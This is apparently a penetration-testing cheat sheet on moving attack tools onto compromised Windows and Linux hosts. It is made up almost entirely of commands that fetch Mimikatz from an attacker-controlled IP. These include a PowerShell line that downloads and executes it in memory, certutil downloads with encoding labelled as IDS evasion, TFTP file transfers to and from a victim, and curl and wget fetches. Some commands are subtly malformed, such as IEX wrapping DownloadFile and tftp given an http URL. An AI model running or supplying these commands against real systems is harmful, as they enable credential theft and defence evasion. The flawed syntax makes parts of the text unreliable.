# File-Transfert-Methods

# Windows Methods

#### Powershell - Download in memory
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.194:8000/Invoke-Mimikatz.ps1')
```

#### Powershell - Download in folder
Detected by Antivirus and SIEM tools such as Varonis
```
IEX (New-Object Net.WebClient).DownloadFile("http://192.168.119.194:8000/mimikatz.exe","C:\temp\mimikatz.exe")
```

#### TFTP 
On the old Windows version sur as Windows XP, Windows 2000

On kali linux
(/tftp is a specific folder where the fille have to be put before to be uploaded on the victim. The uploaded file from the victim will be put here also)
```
atftpd --daemon --port 69 /tftp
```
On Windows
```
➤  Upload
tftp -i http://192.168.119.194:8000/ put filename
➤  Download 
tftp -i http://192.168.119.194:8000/ get filename
```

#### Certutil

Basic transfert
```
certutil.exe -urlcache -split -f http://192.168.119.194:8000/mimikatz.exe output.file
```
Encoded transfert - Basic IPS/IDS evasion
```
certutil.exe -encode mimikatz.exe mimikatz.txt
certutil.exe -urlcache -split -f "http://192.168.119.194:8000/mimikatz.txt" mimikatz.txt
certutil.exe -decode mimikatz.txt mimikatz.exe
```

# Linux Methods

#### Curl
```
curl http://192.168.119.194:8000/mimikatz.exe --output mimikatz.exe
```

#### Wget
```
wget -O mimikatz.exe http://192.168.119.194:8000/mimikatz.exe
```
